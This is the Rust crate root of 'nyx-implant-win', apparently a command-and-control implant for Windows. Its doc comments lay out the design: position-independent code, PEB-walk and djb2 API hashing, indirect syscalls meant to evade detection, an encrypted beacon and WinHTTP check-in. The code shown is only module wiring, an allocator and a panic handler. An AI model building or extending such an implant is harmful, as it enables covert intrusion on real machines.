//! nyx-implant-win — Windows position-independent implant.
//!
//! This crate builds the real Windows PIC agent: `#![no_std]` + `#![no_main]`,
//! a custom NT-Heap allocator, PEB-walk API resolution, indirect syscalls, and
//! a task loop that reuses [`nyx_protocol`] for the encrypted beacon frame.
//!
//! ## Build
//! Requires nightly + the `x86_64-pc-windows-gnu` (or msvc) target. It is
//! intentionally NOT a workspace member so `cargo build --workspace` stays green
//! on the macOS dev host. Check it standalone:
//!
//! ```text
//! cargo +nightly check -p nyx-implant-win --target x86_64-pc-windows-gnu
//! ```
//!
//! Full link + the sRDI PIC-extraction step happen on a Windows host.
//!
//! ## Modules
//! - [`heap`] — alloc glue (Vec/String + a raw-byte `Str`) for the PEB walk.
//! - [`resolve`] — PEB walk + djb2 API resolution; bridges to `nyx_evasion`
//!   so the SSN resolver runs over the *live* ntdll. (Windows-only.)
//! - (A3) `alloc` — NT-Heap `GlobalAlloc`.
//! - (A4) `entry` — PIC entry stub.
//! - (A5) `transport` — minimal WinHTTP check-in.
//! - (A6) indirect-syscall runtime wired to `nyx_evasion`.

#![no_std]
#![no_main]

extern crate alloc;

pub mod heap;

#[cfg(target_os = "windows")]
pub mod ntalloc;
#[cfg(target_os = "windows")]
pub mod beacon;
#[cfg(target_os = "windows")]
pub mod entry;
#[cfg(target_os = "windows")]
pub mod resolve;
#[cfg(target_os = "windows")]
pub mod syscalls;
#[cfg(target_os = "windows")]
pub mod transport;

// Register the NT-Heap allocator so Vec/String work under #![no_std].
#[cfg(target_os = "windows")]
#[global_allocator]
static HEAP: ntalloc::NtHeapAllocator = ntalloc::NtHeapAllocator;

#[panic_handler]
fn _panic(_: &core::panic::PanicInfo) -> ! {
    // panic = abort; in PIC we just trap.
    loop {
        core::hint::spin_loop();
    }
}
